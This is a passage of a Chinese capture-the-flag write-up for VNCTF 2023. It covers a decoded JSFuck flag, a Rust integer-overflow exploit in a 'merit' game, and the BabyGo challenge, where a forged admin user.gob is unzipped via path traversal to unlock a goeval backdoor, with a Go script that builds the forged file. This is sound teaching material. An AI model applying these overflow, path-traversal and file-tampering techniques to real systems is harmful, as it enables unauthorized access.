[])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [+!+[]])[+!+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[+[]]]((!![] + [])[+[]])[([][(!![] + [])[!+[] + !+[] + !+[]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]() + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([![]] + [][[]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]]](([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (![] + [+[]])[([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[+[]] + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]()[+!+[] + [+[]]] + ![] + (![] + [+[]])[([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[+[]] + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]()[+!+[] + [+[]]])()[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((![] + [+[]])[([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[+[]] + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]()[+!+[] + [+[]]]) + [])[+!+[]]) + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]])())</span><br><span class="line"></span><br><span class="line">=&gt; <span class="title function_">alert</span>(<span class="string">&quot;This is your flag: flag&#123;w3lc0m3_t0_VNCTF_2023~~~&#125;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h3><p>装个rust环境，要装VS才能配编译环境，那算了，<a class="link"   target="_blank" rel="noopener" href="https://play.rust-lang.org/?version=stable&mode=debug&edition=2021" >RustPlayground <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 简单用一用</p>
+<p>但其实不太需要看懂rust，浏览源码大致能猜出在干什么：</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Cost&quot;</span>,</span><br><span class="line">        cost: <span class="number">10</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Loan&quot;</span>,</span><br><span class="line">        cost: -<span class="number">1_000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;CCCCCost&quot;</span>,</span><br><span class="line">        cost: <span class="number">500</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Donate&quot;</span>,</span><br><span class="line">        cost: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Sleep&quot;</span>,</span><br><span class="line">        cost: <span class="number">0</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>
+
+<p>定义了一些常量，例如 <code>Payload[Donate] == 1</code> 。</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>表示需要用GET方法访问”&#x2F;“路径，并执行函数中的操作。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#[get(&quot;/reset&quot;)]: 重置功德</span><br><span class="line">post(/upgrade): 更新功德，当功德为负数会被拦截，不能执行其他操作；利用Post方式上传两个参数&quot;name&quot;与&quot;quantity&quot;；name可以取Cost表示扣取10*quantity的功德，Donate表示扣取quantity数量的功德，CCCCCost表示扣取500功德，Loan表示获取1000功德，Sleep表示功德不变；必须上传name和quantity两个参数。</span><br></pre></td></tr></table></figure></div>
+
+<p>当扣取的功德多于已有的功德时不能扣取功德。要想拿到flag需要多于1e9的功德。每次Loan只能获取1e3的功德，理论上只用Loan需要进行1e6次的访问，显然这足够让buu把你ban了。因此需要另辟蹊径。</p>
+<p>在源码中总是出现：<code>cost as i32</code> ，cost中的数被视为一个占内存32位即4个字节的整数类型，32位整数有一位是符号位，31位表示数字的大小，其范围是：<code>[2147483648, 2147483647]</code> 。Cost方法会将quantity*10计算最终扣去的功德，当我们的 <code>quantity==214748365</code> ，那么 <code>quantity*10 == 2147483650 &gt; 2**31-1 </code> 正数范围内的i32类型发生了溢出，溢出大小是3，根据补码的规律，溢出后变为 <code>-(2**31-3+1) == -2147483646</code> ，Cost等扣取功德的方式会让原有的功德减去该Cost，因此会一次性获取非常多的功德。但是加入初始功德不为0，而有1000，<code>1000 - (-2147483646) = 2147484646 &gt; 2**31</code> ，而已有的功德也被定义为i32的整数类型：</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> GONGDE: Lazy&lt;ThreadLocker&lt;<span class="type">i32</span>&gt;&gt; = Lazy::<span class="title function_ invoke__">new</span>(|| ThreadLocker::<span class="title function_ invoke__">from</span>(<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
+
+<p>  因此已有的功德又会再次溢出，溢出值为999，因此溢出后的值为 <code>-(2**31-999+1) == -2147482650</code> ，这样功德就变成负数啦（佛祖很失望啊）</p>
+<p>补码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 用=&gt;表示取补码,考虑8位整数</span><br><span class="line">00000000 = 0 </span><br><span class="line">10000000 = -128 =&gt; 10000000 = -128</span><br><span class="line">10000001 = -127 =&gt; 01111111 = 127</span><br><span class="line">11111111 = -1 =&gt; 00000001 = 1</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="词本"><a href="#词本" class="headerlink" title="词本"></a>词本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">customize: vt. 自定义，定制</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="BabyGo"><a href="#BabyGo" class="headerlink" title="BabyGo"></a>BabyGo</h3><p>参考：<a class="link"   target="_blank" rel="noopener" href="https://www.ctfiot.com/55141.html" >Go-沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>源码：</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">	r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		session.Set(<span class="string">&quot;shallow&quot;</span>, userDir)	<span class="comment">// 设置shallow为userdir</span></span><br><span class="line">		session.Save()</span><br><span class="line">		fileutil.CreateDir(userDir)</span><br><span class="line">		gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)	<span class="comment">// 序列化存储用户权限</span></span><br><span class="line">		user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">		encoder := gob.NewEncoder(gobFile)</span><br><span class="line">		encoder.Encode(user)	<span class="comment">// 存入Low权限</span></span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		fileutil.CreateDir(userUploadDir)</span><br><span class="line">		file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line">		<span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;	<span class="comment">// 截断源码文件防止覆盖</span></span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		filename := userUploadDir + file.Filename</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">			fileutil.RemoveFile(filename)</span><br><span class="line">		&#125;</span><br><span class="line">		err = c.SaveUploadedFile(file, filename)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;	<span class="comment">// 解压</span></span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span>	<span class="comment">// 默认上传文件夹</span></span><br><span class="line">		files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">		destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))	<span class="comment">// 目标路径,拼接默认上传文件夹与GET上传的&quot;path&quot;</span></span><br><span class="line">		<span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;	<span class="comment">// 解压文件</span></span><br><span class="line">			<span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">				err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">				fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">			decoder := gob.NewDecoder(file)</span><br><span class="line">			<span class="keyword">var</span> ctfer User</span><br><span class="line">			decoder.Decode(&amp;ctfer)</span><br><span class="line">			<span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">				eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">				&#125;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>GET访问路由 <code>/</code> 时后台自动新建一个用户权限为 <code>low</code> 的类序列化文件，名为 <code>user.gob</code> ，该文件被存在 <code>userDir</code> 下，即 <code>/tmp/...(好长一串)/</code> ；<br>路由 <code>/upload</code> 提供文件上传功能，不允许上传 <code>&quot;.gob&quot; &quot;.go&quot;</code> 文件，为了避免 <code>user.gob</code> 被直接覆盖。上传的文件默认被放在 <code>userDir/uploads</code> 下。<br>GET方式访问路由 <code>/unzip?path=</code> 解压uploads下所有的压缩包文件，通过Get请求传入参数 <code>path</code> ，拼接 <code>userDir/uploads</code> 与 <code>path</code> 得到解压路径，因此解压路径是可控的，通过传入 <code>path=../</code> 可以将文件解压至父文件夹。<br>通过GET方式访问路由 <code>/backdoor</code> ，服务器提供了一个可以执行GoEval的后门，通过传入参数 <code>pkg</code> 来传入eval的内容。但只有服务器上有用户权限文件且用户权限为 <code>admin</code> 时该后门才被启用。</p>
+<p>分析完各路由功能后即可获得大致思路，为了访问后门需要一个权限为 <code>admin</code> 的用户，需要一个对应的用户文件去覆盖服务器原有的 <code>user.gob</code> 。由于不能直接上传go源码或序列化文件，需要借助解压功能，上传一个压缩过的”user.gob”文件后，通过传入路径 <code>path=../</code> 使其被解压到 <code>uploads/</code> 的父目录即 <code>userDir/</code> 下，覆盖原有的”user.gob”，就能篡改权限。<br>为了在本地生成一个权限为 <code>admin</code> 的”user.gob”，新建一个文件夹与一个go源码文件”getAdmin.go”，写入内容：</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	gobFile, _ := os.Create(<span class="string">&quot;./user.gob&quot;</span>)	<span class="comment">// 序列化存储用户权限</span></span><br><span class="line">	user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: <span class="string">&quot;./&quot;</span>, Power: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">	encoder := gob.NewEncoder(gobFile)</span><br><span class="line">	encoder.Encode(user)	<span class="comment">// 存入Low权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
